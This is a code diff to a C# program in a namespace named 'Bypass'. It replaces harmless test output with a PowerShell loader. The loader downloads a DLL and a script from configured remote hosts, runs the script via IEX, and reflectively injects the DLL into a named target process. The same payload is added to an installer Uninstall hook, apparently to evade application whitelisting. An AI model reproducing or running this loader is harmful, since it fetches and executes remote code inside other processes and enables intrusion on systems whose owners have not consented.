@@ -13,7 +13,13 @@ namespace Bypass
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("hello");
+            StringBuilder sb = new StringBuilder();
+            sb.Append($"${CONFIG.INVOKEREF_VARNAMEA} = (New-Object System.Net.WebClient).DownloadData('{CONFIG.INVOKEREF_HOSTED_DLL_NAME}');");
+            sb.Append($"New-Object System.Net.WebClient).DownloadString('{CONFIG.INVOKEREF_HOSTED_SCRIPT_NAME}') | IEX;");
+            sb.Append($"${CONFIG.INVOKEREF_VARNAMEB} = (Get-Process -Name {CONFIG.INVOKEREF_TARGET_PROCESS}).Id;");
+            sb.Append($"Invoke-ReflectivePEInjection -PEBytes ${CONFIG.INVOKEREF_VARNAMEA} -ProcId ${CONFIG.INVOKEREF_VARNAMEB};");
+
+            Console.WriteLine(sb.ToString());
         }
     }
 
@@ -22,9 +28,13 @@ namespace Bypass
     {
         public async override void Uninstall(System.Collections.IDictionary savedState)
         {
-            
-            string script = $"curl {CONFIG.HTTP_URL}/___hello_from_PSRunspace_via_curl___.txt;";
+            StringBuilder sb = new StringBuilder();
+            sb.Append($"${CONFIG.INVOKEREF_VARNAMEA} = (New-Object System.Net.WebClient).DownloadData('{CONFIG.INVOKEREF_HOSTED_DLL_NAME}');");
+            sb.Append($"New-Object System.Net.WebClient).DownloadString('{CONFIG.INVOKEREF_HOSTED_SCRIPT_NAME}') | IEX;");
+            sb.Append($"${CONFIG.INVOKEREF_VARNAMEB} = (Get-Process -Name {CONFIG.INVOKEREF_TARGET_PROCESS}).Id;");
+            sb.Append($"Invoke-ReflectivePEInjection -PEBytes ${CONFIG.INVOKEREF_VARNAMEA} -ProcId ${CONFIG.INVOKEREF_VARNAMEB};");
 
+            string script = sb.ToString();
 
 
             Assembly sma;
